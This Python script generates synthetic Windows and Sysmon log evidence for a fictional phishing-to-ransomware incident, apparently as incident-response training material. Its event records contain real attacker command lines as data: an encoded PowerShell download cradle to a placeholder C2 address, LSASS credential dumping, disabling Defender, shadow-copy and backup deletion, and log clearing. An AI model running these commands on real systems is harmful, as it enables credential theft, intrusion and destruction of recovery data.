#!/usr/bin/env python3
"""
Generates the synthetic evidence set for case IR-2026-1027 ("Payroll phish to ransomware"),
in the same JSON layout the collectors produce. Deterministic, no real malware involved.

Story (continues Project 08): tnguyen opens the HTML-smuggling attachment on WS-0102, which
drops an ISO; a loader establishes C2, persists, dumps LSASS, moves laterally to FS01 with
PsExec, deletes shadow copies, encrypts the share and clears logs.

All IPs are RFC 5737 documentation addresses; hashes are SHA-256 of placeholder strings.
"""
import hashlib
import json
from datetime import datetime, timedelta
from pathlib import Path

OUT = Path(__file__).resolve().parent
T0 = datetime(2026, 10, 27, 14, 25, 0)
C2 = "198.51.100.66"


def h(s):
    return hashlib.sha256(s.encode()).hexdigest()


def t(sec):
    return (T0 + timedelta(seconds=sec)).strftime("%Y-%m-%dT%H:%M:%S.000Z")


def proc(sec, host, user, image, cmd, parent, pcmd="", pid=0, ppid=0):
    return {"TimeCreated": t(sec), "Computer": host, "Id": 1, "Provider": "Microsoft-Windows-Sysmon",
            "User": user, "Image": image, "CommandLine": cmd, "ParentImage": parent, "ParentCommandLine": pcmd,
            "ProcessId": pid, "ParentProcessId": ppid, "Hashes": f"SHA256={h(image + cmd)[:64].upper()}"}


def net(sec, host, user, image, dst, port):
    return {"TimeCreated": t(sec), "Computer": host, "Id": 3, "Provider": "Microsoft-Windows-Sysmon", "User": user,
            "Image": image, "DestinationIp": dst, "DestinationPort": port, "Protocol": "tcp"}


def fcreate(sec, host, user, image, target):
    return {"TimeCreated": t(sec), "Computer": host, "Id": 11, "Provider": "Microsoft-Windows-Sysmon", "User": user,
            "Image": image, "TargetFilename": target}


def build_ws():
    host, u = "WS-0102.corp.example", "CORP\\tnguyen"
    ev = [
        # benign background
        proc(-3600, host, u, r"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE", "OUTLOOK.EXE", r"C:\Windows\explorer.exe"),
        proc(-1800, host, u, r"C:\Program Files\Microsoft\Edge\Application\msedge.exe", "msedge.exe https://intranet.corp.example", r"C:\Windows\explorer.exe"),
        # initial access: smuggled HTML -> ISO mounted -> LNK -> mshta
        fcreate(0, host, u, r"C:\Program Files\Microsoft\Edge\Application\msedge.exe", r"C:\Users\tnguyen\Downloads\Payroll_Nov2026.iso"),
        proc(95, host, u, r"C:\Windows\System32\mshta.exe", r'"mshta.exe" "E:\Payroll_Nov2026.hta"', r"C:\Windows\explorer.exe", pid=6120, ppid=4412),
        proc(101, host, u, r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
             "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADYANgAvAGEAJwApAA==",
             r"C:\Windows\System32\mshta.exe", pid=6340, ppid=6120),
        net(103, host, u, r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", C2, 80),
        fcreate(110, host, u, r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", r"C:\ProgramData\SysUpdate\upd.dll"),
        proc(115, host, u, r"C:\Windows\System32\rundll32.exe", r"rundll32.exe C:\ProgramData\SysUpdate\upd.dll,Start",
             r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", pid=7012, ppid=6340),
        *[net(120 + i * 60 + ((i * 7) % 5) - 2, host, u, r"C:\Windows\System32\rundll32.exe", C2, 443) for i in range(30)],
        # persistence
        proc(140, host, u, r"C:\Windows\System32\schtasks.exe",
             r'schtasks /create /tn "MicrosoftEdgeUpdateTaskCore" /tr "rundll32.exe C:\ProgramData\SysUpdate\upd.dll,Start" /sc onlogon /rl highest',
             r"C:\Windows\System32\rundll32.exe", pid=7100, ppid=7012),
        {"TimeCreated": t(141), "Computer": host, "Id": 4698, "Provider": "Microsoft-Windows-Security-Auditing", "User": u,
         "TaskName": r"\MicrosoftEdgeUpdateTaskCore", "TaskContent": r"rundll32.exe C:\ProgramData\SysUpdate\upd.dll,Start"},
        # discovery
        proc(600, host, u, r"C:\Windows\System32\cmd.exe", "cmd.exe /c whoami /all & net group \"domain admins\" /domain & nltest /dclist:corp.example",
             r"C:\Windows\System32\rundll32.exe", pid=7300, ppid=7012),
        # privilege escalation abused local admin (helpdesk-installed), credential dumping
        proc(1500, host, "NT AUTHORITY\\SYSTEM", r"C:\Windows\System32\rundll32.exe",
             r"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 704 C:\ProgramData\SysUpdate\d.bin full",
             r"C:\Windows\System32\cmd.exe", pid=7420, ppid=7300),
        {"TimeCreated": t(1500), "Computer": host, "Id": 10, "Provider": "Microsoft-Windows-Sysmon", "User": "NT AUTHORITY\\SYSTEM",
         "SourceImage": r"C:\Windows\System32\rundll32.exe", "TargetImage": r"C:\Windows\System32\lsass.exe", "GrantedAccess": "0x1FFFFF"},
        # defense evasion
        proc(1600, host, "NT AUTHORITY\\SYSTEM", r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
             "powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true", r"C:\Windows\System32\cmd.exe"),
        # lateral movement with stolen svc_backup creds
        proc(3600, host, "CORP\\svc_backup", r"C:\ProgramData\SysUpdate\PsExec64.exe",
             r"PsExec64.exe \\FS01.corp.example -accepteula -s cmd.exe /c C:\Windows\Temp\lk.exe", r"C:\Windows\System32\cmd.exe"),
        net(3601, host, "CORP\\svc_backup", r"C:\ProgramData\SysUpdate\PsExec64.exe", "10.10.5.20", 445),
    ]
    snapshot = {
        "host": {"hostname": host, "os": "Windows 11 Pro 23H2", "ip": "10.10.20.102", "collected_utc": "2026-10-27T20:10:00Z",
                 "collected_by": "X. West (IR-2026-1027)", "timezone": "Eastern Standard Time"},
        "processes": [
            {"Name": "rundll32.exe", "ProcessId": 7012, "ParentProcessId": 6340, "Path": r"C:\Windows\System32\rundll32.exe",
             "CommandLine": r"rundll32.exe C:\ProgramData\SysUpdate\upd.dll,Start", "User": u, "SHA256": h("rundll32").upper()},
            {"Name": "OUTLOOK.EXE", "ProcessId": 4012, "ParentProcessId": 4412, "Path": r"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE",
             "CommandLine": "OUTLOOK.EXE", "User": u, "SHA256": h("outlook").upper()},
        ],
        "network": [
            {"LocalAddress": "10.10.20.102", "LocalPort": 55210, "RemoteAddress": C2, "RemotePort": 443, "State": "Established", "OwningProcess": 7012},
            {"LocalAddress": "10.10.20.102", "LocalPort": 55100, "RemoteAddress": "192.0.2.40", "RemotePort": 443, "State": "Established", "OwningProcess": 4012},
        ],
        "autoruns": [
            {"Location": r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Name": "OneDrive",
             "Value": r'"C:\Users\tnguyen\AppData\Local\Microsoft\OneDrive\OneDrive.exe" /background'},
        ],
        "scheduled_tasks": [
            {"TaskName": r"\MicrosoftEdgeUpdateTaskCore", "Author": "CORP\\tnguyen", "Action": r"rundll32.exe C:\ProgramData\SysUpdate\upd.dll,Start", "Trigger": "AtLogon", "RunLevel": "Highest"},
            {"TaskName": r"\Microsoft\Windows\Defrag\ScheduledDefrag", "Author": "Microsoft Corporation", "Action": r"%windir%\system32\defrag.exe -c -h -o -$", "Trigger": "Weekly", "RunLevel": "Highest"},
        ],
        "services": [],
    }
    return host, ev, snapshot


def build_fs():
    host = "FS01.corp.example"
    ev = [
        {"TimeCreated": t(3602), "Computer": host, "Id": 4624, "Provider": "Microsoft-Windows-Security-Auditing",
         "TargetUserName": "svc_backup", "LogonType": 3, "IpAddress": "10.10.20.102"},
        {"TimeCreated": t(3603), "Computer": host, "Id": 7045, "Provider": "Service Control Manager", "User": "CORP\\svc_backup",
         "ServiceName": "PSEXESVC", "ImagePath": r"%SystemRoot%\PSEXESVC.exe", "StartType": "demand start"},
        proc(3604, host, "NT AUTHORITY\\SYSTEM", r"C:\Windows\Temp\lk.exe", r"C:\Windows\Temp\lk.exe --path D:\Shares --ext .lockd",
             r"C:\Windows\PSEXESVC.exe", pid=5100, ppid=5080),
        proc(3606, host, "NT AUTHORITY\\SYSTEM", r"C:\Windows\System32\vssadmin.exe", "vssadmin.exe delete shadows /all /quiet",
             r"C:\Windows\Temp\lk.exe", pid=5120, ppid=5100),
        proc(3607, host, "NT AUTHORITY\\SYSTEM", r"C:\Windows\System32\wbadmin.exe", "wbadmin delete catalog -quiet",
             r"C:\Windows\Temp\lk.exe", pid=5130, ppid=5100),
        proc(3608, host, "NT AUTHORITY\\SYSTEM", r"C:\Windows\System32\bcdedit.exe", "bcdedit /set {default} recoveryenabled no",
             r"C:\Windows\Temp\lk.exe", pid=5140, ppid=5100),
        *[fcreate(3610 + i, host, "NT AUTHORITY\\SYSTEM", r"C:\Windows\Temp\lk.exe", rf"D:\Shares\Finance\file_{i:04d}.xlsx.lockd") for i in range(250)],
        fcreate(3900, host, "NT AUTHORITY\\SYSTEM", r"C:\Windows\Temp\lk.exe", r"D:\Shares\README_RESTORE_FILES.txt"),
        proc(3950, host, "NT AUTHORITY\\SYSTEM", r"C:\Windows\System32\wevtutil.exe", "wevtutil.exe cl Security",
             r"C:\Windows\Temp\lk.exe", pid=5200, ppid=5100),
        {"TimeCreated": t(3951), "Computer": host, "Id": 1102, "Provider": "Microsoft-Windows-Eventlog", "User": "NT AUTHORITY\\SYSTEM"},
    ]
    snapshot = {
        "host": {"hostname": host, "os": "Windows Server 2019", "ip": "10.10.5.20", "collected_utc": "2026-10-27T20:40:00Z",
                 "collected_by": "X. West (IR-2026-1027)", "timezone": "Eastern Standard Time"},
        "processes": [], "network": [], "autoruns": [], "scheduled_tasks": [],
        "services": [{"Name": "PSEXESVC", "PathName": r"C:\Windows\PSEXESVC.exe", "StartMode": "Manual", "State": "Stopped"}],
    }
    return host, ev, snapshot


for builder in (build_ws, build_fs):
    host, events, snap = builder()
    d = OUT / host.split(".")[0]
    d.mkdir(exist_ok=True)
    (d / "events.json").write_text(json.dumps(events, indent=1))
    for k, v in snap.items():
        (d / f"{k}.json").write_text(json.dumps(v, indent=1))
    manifest = [f"{hashlib.sha256(p.read_bytes()).hexdigest()}  {p.name}" for p in sorted(d.glob("*.json"))]
    (d / "SHA256SUMS").write_text("\n".join(manifest) + "\n")
print("[+] evidence generated")
